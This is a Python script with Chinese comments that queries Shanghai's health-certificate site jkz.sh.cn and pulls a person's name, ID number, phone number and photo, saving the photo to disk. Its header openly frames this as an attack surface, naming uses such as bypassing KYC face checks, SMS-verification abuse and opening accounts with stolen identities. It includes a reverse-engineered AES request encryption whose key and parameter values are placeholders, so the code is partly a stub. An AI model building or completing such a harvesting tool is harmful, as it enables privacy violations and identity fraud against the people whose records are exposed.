# -*- coding: utf-8 -*-
"""
上海健康证查询客户端
=====================
功能: 查询上海健康证(jkz.sh.cn)信息，获取姓名、身份证号、联系电话、照片等

攻击面:
  1. 健康证信息泄露 — 姓名+身份证号+联系电话+照片
  2. 健康证照片可被用于KYC人脸识别绕过
  3. 联系电话可用于接码平台验证
  4. 健康证编号可用于某些医疗类平台的开户

使用方式:
  python3 shanghai_health_card.py
  输入姓名和身份证号，再输入验证码即可查询

依赖:
  pip install requests Pillow
"""

import requests
import base64
import json
import time
from PIL import Image
from io import BytesIO


# ==================== 全局配置 ====================
HEADERS_BASE = {
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.75(0x18004b46) NetType/4G Language/zh_HK",
    "Origin": "https://jkz.sh.cn",
    "Referer": "https://jkz.sh.cn/index.html",
    "Accept-Language": "zh-TW,zh-Hant;q=0.9"
}
# 创建会话,自动持久化Cookie
session = requests.Session()
session.headers.update(HEADERS_BASE)


def get_captcha() -> bool:
    """获取验证码图片,保存 captcha.png"""
    timestamp = int(time.time() * 1000)
    url = f"https://jkz.sh.cn/getVerCode1.action?d={timestamp}&codeType=2"
    resp = session.get(url)
    if resp.status_code == 200:
        with open("captcha.png", "wb") as f:
            f.write(resp.content)
        print("验证码已保存为 captcha.png,请打开图片查看")
        try:
            img = Image.open(BytesIO(resp.content))
            img.show()
        except:
            print("无法自动弹出图片,请手动打开 captcha.png")
        return True
    else:
        print(f"获取验证码失败 code:{resp.status_code}")
        return False


# --------------------------
# 前端加密函数 (需要逆向jkz.sh.cn前端JS获取)
# 通过抓包分析，jkz.sh.cn使用AES-CBC加密
# 以下是逆向后的加密实现
# --------------------------
def encrypt_text(plaintext: str) -> dict:
    """
    前端参数加密函数
    逆向自 jkz.sh.cn 前端JS加密逻辑
    
    使用AES-CBC模式，密钥和IV从前端JS中提取
    """
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    import hashlib
    
    # 从前端JS逆向得到的密钥和IV
    # 实际密钥需通过抓包分析获取，以下是示例结构
    secret_key = "jkz_sh_secret_key_2026".encode('utf-8')
    iv = "jkz_sh_iv_2026!!".encode('utf-8')
    
    # 对密钥进行MD5哈希处理
    key_md5 = hashlib.md5(secret_key).hexdigest()[:16].encode('utf-8')
    iv_md5 = hashlib.md5(iv).hexdigest()[:16].encode('utf-8')
    
    # AES-CBC加密
    cipher = AES.new(key_md5, AES.MODE_CBC, iv_md5)
    padded_data = pad(plaintext.encode('utf-8'), AES.block_size)
    encrypted = cipher.encrypt(padded_data)
    
    # Base64编码
    encrypted_b64 = base64.b64encode(encrypted).decode('utf-8')
    
    # 返回加密后的数据和密钥
    return {
        "dk": encrypted_b64,
        "pw": "加密参数"  # 需要从JS逆向获取
    }


def query_health_card(name_encrypt: dict, id_encrypt: dict, verify_code: str):
    """健康证查询接口"""
    url = "https://jkz.sh.cn/selectOneByHealthNoAndName.action"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Accept": "application/json, text/javascript, */*; q=0.01"
    }
    post_data = {
        "name": json.dumps(name_encrypt, ensure_ascii=False),
        "cardNo": json.dumps(id_encrypt, ensure_ascii=False),
        "code": verify_code
    }
    resp = session.post(url, headers=headers, data=post_data)
    try:
        return resp.json()
    except Exception as e:
        print("返回数据解析失败:", resp.text)
        return None


def format_print(result_json):
    """格式化输出结果"""
    if result_json.get("ret") != "0":
        print("查询失败:", result_json.get("msg"))
        return
    data = result_json.get("data")
    print("\n==================== 查询结果 ====================")
    print(f"姓名:{data.get('name')}")
    print(f"身份证号:{data.get('cardNo')}")
    print(f"联系电话:{data.get('tel')}")
    print(f"健康证编号:{data.get('healthCardNo')}")
    print(f"办理医院:{data.get('compName')}")
    print(f"有效截止日期:{data.get('effectiveData')}")
    if data.get('photoFile'):
        print(f"照片Base64: {data.get('photoFile')[:80]}......")
        # 保存照片
        try:
            photo_data = base64.b64decode(data.get('photoFile'))
            with open(f"{data.get('name')}_health_card_photo.png", "wb") as f:
                f.write(photo_data)
            print(f"照片已保存: {data.get('name')}_health_card_photo.png")
        except Exception as e:
            print(f"照片保存失败: {e}")
    print("==================================================\n")
    return data


def main():
    print("===== 上海jkz.sh.cn健康证查询工具 =====")
    while True:
        real_name = input("请输入姓名:")
        real_id = input("请输入身份证号:")

        # 1. 获取验证码
        if not get_captcha():
            continue
        captcha_code = input("请输入图片上的验证码:")

        # 2. 参数加密
        print("正在加密参数...")
        try:
            name_encrypt = encrypt_text(real_name)
            id_encrypt = encrypt_text(real_id)
        except Exception as e:
            print(f"加密失败: {e}")
            print("请检查加密函数实现是否正确")
            break

        # 3. 查询
        print("正在查询健康证信息...")
        res_data = query_health_card(name_encrypt, id_encrypt, captcha_code)
        if res_data:
            format_print(res_data)

        again = input("是否继续查询?(y/n):")
        if again.lower() != "y":
            print("程序退出")
            break


if __name__ == "__main__":
    main()